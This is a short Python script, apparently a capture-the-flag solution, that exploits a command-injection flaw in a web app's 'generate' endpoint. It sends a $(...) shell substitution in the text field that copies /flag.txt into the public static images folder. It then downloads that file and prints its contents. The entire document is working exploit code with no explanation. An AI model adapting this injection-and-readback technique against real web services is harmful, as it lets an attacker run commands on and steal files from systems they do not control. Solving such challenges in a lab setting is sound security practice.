import requests
import sys
import random

url = sys.argv[1]
filename = str(random.randrange(1000))
requests.post(url+"generate", {"text":f"$(echo \"$(cat /flag.txt)\" > /app/static/images/{filename})"})
r = requests.get(url + "static/images/" + filename)
print(r.text)
